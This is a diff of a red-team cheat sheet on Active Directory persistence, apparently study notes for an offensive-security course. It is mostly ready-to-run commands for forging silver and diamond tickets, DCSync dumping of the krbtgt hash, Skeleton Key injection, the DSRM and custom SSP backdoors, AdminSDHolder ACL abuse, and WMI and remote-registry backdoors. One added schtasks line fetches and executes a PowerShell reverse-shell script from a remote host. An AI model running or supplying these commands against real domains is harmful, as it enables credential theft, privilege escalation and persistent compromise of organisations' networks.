@@ -130,9 +130,10 @@ Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /targ
 **Schedudle an execute a task with silver ticket of "HOST" Service**
 
 {% code overflow="wrap" %}
-```
-schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke_powerShellTcp.ps1''')'"
+```powershell
+Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:host /rc4:hash /user:Administrator /ptt"'
 
+schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke_powerShellTcp.ps1''')'"
 schtasks /Run /S hostname.dom.local /TN "STCheck"
 ```
 {% endcode %}
@@ -145,11 +146,53 @@ schtasks /Run /S hostname.dom.local /TN "STCheck"
 **List tasks**\
 ****schtasks /S hostname.dom.local
 
+## 💎Diamond Ticket
+
+### Description
+
+* A diamond ticket is created by decrypting a valid TGT, making changes to it and re encrypt it using the AES keys of the krbtgt account.
+* Golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack.
+* Once again, the persistence lifetime depends on krbtgt account.
+* It is more opsec safe because:
+  * Valid ticket times because a TGT issued by the DC is modified;\
+    In golden ticket, there is no corresponding TGT request for TGS/Service ticket requests as the TGT is forged.
+
+### Requirements
+
+Krbtgt AES Key
+
+### Tools
+
+{% code overflow="wrap" %}
+```powershell
+Rubeus.exe diamond
+/krbkey:hash /user:yourusername /password:yourpw /enctype:aes /ticketuser:administrator /domain:dom.local /dc:dcname.dom.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show ptt
+
+use /tgtdeleg in place of credentials in case we have access as a domain user
+Rubeus.exe diamond
+/krbkey:hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dom.local /dc:dcname.dom.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show ptt
+```
+{% endcode %}
+
+## 🔁DCSync Attack
+
+**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**
+
+{% code overflow="wrap" %}
+```powershell
+Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'
+
+SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
+```
+{% endcode %}
+
+##
+
 ## 🦴Skeleton Key
 
 ### Description
 
-* Skeleton KEy is a persistance technique whewre it is possible to patch a Domain Controllers lsass process, that it allows access ans any user with a single password.
+* Skeleton Key is a persistance technique whewre it is possible to patch a Domain Controllers lsass process, that it allows access ans any user with a single password.
 * The regular Password and the new password will work
 * Malware named "Skeleton Key" used it
 * Not persistent after reboot/lsass process restart
@@ -162,15 +205,15 @@ schtasks /Run /S hostname.dom.local /TN "STCheck"
 
 ### Tools
 
-**Inject a skeleton key, password will be mimikatz - DA rights required**
+**Inject a skeleton key, password will be "mimikatz" - DA rights required**
 
 {% code overflow="wrap" %}
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local
+
+Now you can login with the password "mimikatz" e.g. with Enter-PSSession -computername dc-hostname -credential dom\Administrator  => with the Password mimikatz
 ```
 {% endcode %}
-
-Now you can login e.g. with Enter-PSSession
 
 ❓Debug really needed?
 
@@ -223,7 +266,7 @@ Compare the Administrator hash with the Administrator hash of the below command
 Invoke-Mimikatz - Command '"lsadump:lsa /patch"' -computername dchostname.dc.local
 ```
 
-\
+\=> First command is the DSRM local Administrator\
 \=> Here we that it from the lsass process => This is the Administrator account of the Domain
 
 **Change the logon behaviour of the DSRM Account before we can use the DSRM Hash**
@@ -236,9 +279,7 @@ Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" - name "DsrmAdmin
 Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
 </code></pre>
 
-
-
-**Later we can us the following command to get DA back**
+**Then , we can us the following command to get DA back / pass the hash**
 
 {% code overflow="wrap" %}
 ```powershell
@@ -254,7 +295,7 @@ ls \\dc\c$
 
 ### Description
 
-* SSP is a DLL which provides ways fot an application to obtain an authenticated connection. Examples from SSP provided by Microsoft: NTLM, Kerberost, Wdigest, CredSSP
+* SSP is a DLL which provides ways for an application to obtain an authenticated connection. Examples from SSP provided by Microsoft: NTLM, Kerberost, Wdigest, CredSSP
 * Mimikatz provides custom SSP - mimilib.dll - This logs local logons, service account and machine account passwords in clear text on the targer server
 
 ### Requirement
@@ -277,7 +318,7 @@ All logons on the DC are logged to C:\Windows\system32\kiwissp.log
 ```
 {% endcode %}
 
-**Way2: Using mimikatz, inject into lsass (not stable with Server 2016/sometimes it works) / injects into lsass**&#x20;
+**Way2: Using mimikatz, inject into lsass (not stable with Server 2016/2019 - sometimes it works) / injects into lsass**&#x20;
 
 {% code overflow="wrap" %}
 ```powershell
@@ -297,9 +338,9 @@ All logons on the DC are logged to C:\Windows\system32\kiwissp.log
 * Resides in the System container of a domain and used to control the permissions, using an ACL, for certain built-in privileged groups (called Protected Groups)
 * ❓ AdminSDHolder its own ACL is used for Protected Groups
 * Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of Protected Groups/AdminSDholder and overwrites all members of Protected Group ACLs with the ACLs of the AdminSDholder
-* Protected groups: Domain Admins, Administrators, Enterpse Admins, Domain Controllers, Read-only Domain Controllers, Schema AdminsAccount Operators, Backup Operators, Server Operators, Print Operators, Replicator\
+* Protected Groups are: Domain Admins, Administrators, Enterpse Admins, Domain Controllers, Read-only Domain Controllers, Schema AdminsAccount Operators, Backup Operators, Server Operators, Print Operators, Replicator\
   ❓ Protected User group as well
-*   Well known abuse of proteced groups - see following permissions\
+*   Well known abuse of Proteced Groups - see following permissions\
 
 
     <figure><img src=".gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
@@ -311,19 +352,29 @@ All logons on the DC are logged to C:\Windows\system32\kiwissp.log
 ### Tools
 
 **Attack**\
-****Modify the Permissions of AdminSDholder and add your Account as member via GUI or remotly
+****Modify the Permissions of AdminSDholder and add your Account as member via GUI or remotely.
 
-Add FullControl permissions for a user to the AdminSDHolder using PowerView as DomainAdmin:\
-
+Add FullControl permissions for a user to the AdminSDHolder using PowerView as DomainAdmin:
 
 {% code overflow="wrap" %}
 ```powershell
-Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName yourusername -Rigths All -verbose
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dom,dc=local' -PrincipalIdentity username -Rights All -PrincipalDomain dom.local -TargetDomain dom.local -verbose
+
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dom,dc=local' -PrincipalIdentity username -Rights ResetPassword -PrincipalDomain dom.local -TargetDomain dom.local -verbose
+
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dom,dc=local' -PrincipalIdentity username -Rights WriteMembers -PrincipalDomain dom.local -TargetDomain dom.local -verbose
 ```
 {% endcode %}
 
-Using ActiveDirectory Moduel and Set-ADACL:\
+Using ActiveDirectory Module and RACE toolkit [https://github.com/samratashok/RACE](https://github.com/samratashok/RACE):
 
+{% code overflow="wrap" %}
+```powershell
+Set-DCPermissions -Method AdminSDHolder -SAMAccountName username -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dom,DC=local' -Verbose
+```
+{% endcode %}
+
+❓ Still working? Using ActiveDirectory Moduel and Set-ADACL:
 
 {% code overflow="wrap" %}
 ```powershell
@@ -339,6 +390,14 @@ $sess = NewPsSession -computername dchostn.local
 Invoke-Command -filepath .\Invoke-SDPropagator.ps -sessoin $sess
 Enter-pssession -sesion $sess
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+```
+{% endcode %}
+
+Check Domain Admins permissoins&#x20;
+
+{% code overflow="wrap" %}
+```powershell
+Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentxxx"}
 ```
 {% endcode %}
 
@@ -391,8 +450,13 @@ Set-ADAccountPassword -Identity yourusername -newPassword (ConvertTo-SecureStrin
 . .\Invoke-SDPropagator
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 ❗Remember to add your user to other protected groups to be stealthier
+
+Pre-Server 2008:
+Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
 ```
 {% endcode %}
+
+
 
 
 
@@ -413,10 +477,10 @@ Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
 
 {% code overflow="wrap" %}
 ```powershell
-Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights All -verbose
+Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights All -principaldomain dom.local -targetdomain dom.local -verbose
 
 Using AD Module
-Set-ADACL -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -principal yourusername -verbose
+Set-ADACL -samaccountname username -distinguishedname 'DC=subodmain,DC=domain,DC=local' -right GenericAll -verbose
 ```
 {% endcode %}
 
@@ -426,10 +490,10 @@ Set-ADACL -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -principal yourus
 
 {% code overflow="wrap" %}
 ```powershell
-Add-ObjectAcl -TargetDistinguisedName 'DC=subodmain,DC=domain,DC=local' -PrincipalSamAccountName yourusername -Rights DCSync -verbose
+Add-DomainObjectAcl -TargetIdentity 'DC=subodmain,DC=domain,DC=local' -PrincipalIdentity yourusername -Rights DCSync  -principaldomain dom.local -targetdomain dom.local -verbose
 
 Using AD Module
-Set-ADACL -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -principal yourusername -GUIDRight DCSync -verbose
+Set-ADACL -samaccountname username -DistinguishedName 'DC=subodmain,DC=domain,DC=local' -GUIDRight DCSync -verbose
 ```
 {% endcode %}
 
@@ -437,8 +501,10 @@ In the GUI they are called Replicating Directory Changes, Replicating Direcotry 
 
 DCSync in general very interesting because no commands need to be excuted on the DC itself after the initial attack
 
-Execute DCSync\
-Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'\
+**Execute DCSync**\
+Invoke-Mimikatz -command '"lsadump::dcsync /user:dom\krbtgt"'
+
+SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"\
 \=> Other accounts such as dom\Administrator etc. or any other user who have DCSync rights
 
 ## 🔑ACLs - Security Descriptors
@@ -486,7 +552,7 @@ Execute commands via WMI now possible
 {% code overflow="wrap" %}
 ```powershell
 On Local machine for user1 on all WMI namespaces and DCOM
-Set-RemoteWMI -Username user1 -verbose
+Set-RemoteWMI -SamAccountName user1 -verbose
 ```
 {% endcode %}
 
@@ -494,7 +560,7 @@ Set-RemoteWMI -Username user1 -verbose
 
 {% code overflow="wrap" %}
 ```powershell
-Set-RemoteWMI -Username user1 -computername hostname -namespace 'root\cimv2' -verbose
+Set-RemoteWMI -SamAccountName user1 -computername hostname -namespace 'root\cimv2' -verbose
 ```
 {% endcode %}
 
@@ -502,15 +568,15 @@ Set-RemoteWMI -Username user1 -computername hostname -namespace 'root\cimv2' -ve
 
 {% code overflow="wrap" %}
 ```powershell
-Set-RemoteWMI -Username user1 -computername hostname -credential administrator -namespace 'root\cimv2' -verbose
+Set-RemoteWMI -SamAccountName user1 -computername hostname -credential administrator -namespace 'root\cimv2' -verbose
 ```
 {% endcode %}
 
-**O remote machine remove permissions**
+**On remote machine remove permissions**
 
 {% code overflow="wrap" %}
 ```powershell
-Set-RemoteWMI -Username user1 -computername hostname -namespace 'root\cimv2' -remove -verbose
+Set-RemoteWMI -SamAccountName user1 -computername hostname -namespace 'root\cimv2' -remove -verbose
 Invoke-Command -scriptblock{whoami} -computername dchost.dc.local => Does not work, because no DA privs, but only WMI Privs
 ```
 {% endcode %}
@@ -540,13 +606,13 @@ Set-RemotePSRemoting -username user1 -computername argethost.dom.local -remove
 ```
 {% endcode %}
 
-**Using DAMP toolkit:**\
-**1.Remote Registry: Start using DAMP with domain admin privs on remote host**\
-
+**Using RACE or DAMP toolkit:**\
+**1.Remote Registry: Start using DAMP with admin privs on remote host**
 
 {% code overflow="wrap" %}
 ```powershell
 Add-RemoteRegBackdoor -computername dchostname -Trustee username -verbose
+
 . .\RemoteHashRetrieval.ps1 (maybe replace $IV with $InitV) when there are errors with the following commands
 ```
 {% endcode %}
